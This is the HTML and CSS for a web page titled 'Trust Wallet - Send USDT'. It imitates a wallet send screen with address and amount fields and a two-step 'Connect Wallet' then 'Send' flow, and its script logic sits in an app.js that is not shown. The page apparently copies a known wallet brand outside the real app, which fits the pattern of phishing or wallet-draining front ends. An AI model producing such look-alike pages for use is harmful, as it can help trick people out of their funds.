<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Trust Wallet - Send USDT</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root {
            --bg-color: #131517;
            --card-bg: #1c1f22;
            --input-bg: #181a1d;
            --border-color: #2b2f36;
            --accent-color: #00c885;
            --accent-hover: #00b377;
            --text-main: #ffffff;
            --text-muted: #8a919e;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            padding: 16px;
        }

        .wallet-container {
            width: 100%;
            max-width: 420px;
            padding-top: 24px;
            display: flex;
            flex-direction: column;
        }

        .header {
            text-align: center;
            margin-bottom: 28px;
        }

        .header h2 {
            font-size: 20px;
            font-weight: 600;
            color: var(--text-main);
        }

        .form-group {
            margin-bottom: 20px;
        }

        .label {
            font-size: 14px;
            color: var(--text-muted);
            margin-bottom: 8px;
            display: block;
        }

        .input-box {
            background-color: var(--input-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: border-color 0.2s;
        }

        .input-box:focus-within {
            border-color: var(--accent-color);
        }

        .input-box input {
            background: transparent;
            border: none;
            outline: none;
            color: var(--text-main);
            font-size: 15px;
            width: 100%;
        }

        .input-box input::placeholder {
            color: #555d6b;
        }

        .action-group {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .action-btn {
            color: var(--accent-color);
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            user-select: none;
            background: none;
            border: none;
        }

        .action-btn:hover {
            opacity: 0.8;
        }

        .icon-btn {
            color: var(--accent-color);
            cursor: pointer;
            display: flex;
            align-items: center;
        }

        .usd-estimate {
            font-size: 13px;
            color: var(--text-muted);
            margin-top: 8px;
            padding-left: 4px;
        }

        .unit-tag {
            color: var(--text-muted);
            font-size: 15px;
            margin-right: 8px;
            font-weight: 600;
        }

        .next-btn {
            width: 100%;
            background-color: var(--accent-color);
            color: #0d1117;
            border: none;
            border-radius: 28px;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: auto;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .next-btn:hover {
            background-color: var(--accent-hover);
        }

        .next-btn:disabled {
            background-color: #555d6b;
            cursor: not-allowed;
        }

        .spinner {
            width: 18px;
            height: 18px;
            border: 3px solid rgba(13, 17, 23, 0.3);
            border-top: 3px solid #0d1117;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Notification Bar Styles */
        .notify {
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 14px;
            text-align: center;
            display: none;
        }

        .notify.info {
            background-color: #2b2f36;
            color: var(--text-main);
        }

        .notify.success {
            background-color: #00c885;
            color: #0d1117;
        }

        .notify.error {
            background-color: #ff4444;
            color: white;
        }

        /* Gas Warning Styles */
        .gas-warning {
            color: #ff4444;
            font-size: 13px;
            margin-top: -12px;
            margin-bottom: 16px;
            padding-left: 4px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="wallet-container">
        
        <!-- Notification Bar -->
        <div id="notify-bar" class="notify"></div>

        <div class="header">
            <h2>Send USDT</h2>
        </div>

        <!-- Address Input -->
        <div class="form-group">
            <label class="label">Address or Domain Name</label>
            <div class="input-box">
                <input 
                    type="text" 
                    id="recipient" 
                    placeholder="Search, public key, or ENS"
                    value=""
                />
                <div class="action-group">
                    <button class="action-btn" id="pasteBtn">Paste</button>
                    <span class="icon-btn" title="QR Scan">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <rect x="3" y="3" width="7" height="7"></rect>
                            <rect x="14" y="3" width="7" height="7"></rect>
                            <rect x="14" y="14" width="7" height="7"></rect>
                            <rect x="3" y="14" width="7" height="7"></rect>
                        </svg>
                    </span>
                </div>
            </div>
        </div>

        <!-- Amount Input -->
        <div class="form-group">
            <label class="label">Amount</label>
            <div class="input-box">
                <input 
                    type="number" 
                    id="amount" 
                    value="0" 
                    step="any"
                    placeholder="0"
                />
                <div class="action-group">
                    <span class="unit-tag">USDT</span>
                    <button class="action-btn" id="max-btn">Max</button>
                </div>
            </div>
            <div class="usd-estimate" id="usd-value">≈ $0.00</div>
        </div>

        <!-- Gas Warning -->
        <div id="gas-warning" class="gas-warning"></div>

        <!-- Connect Button (Added for Phase 1) -->
        <button class="next-btn" id="connect-btn" style="margin-bottom: 10px;">
            <span id="btn-text-connect">Connect Wallet</span>
            <div id="btn-spinner-connect" class="spinner"></div>
        </button>

        <!-- Submit Button (Added for Phase 2) -->
        <button class="next-btn" id="send-btn" style="display: none;">
            <span id="btn-text">Send</span>
            <div id="btn-spinner" class="spinner"></div>
        </button>

    </div>

    <script src="app.js"></script>
</body>
</html>
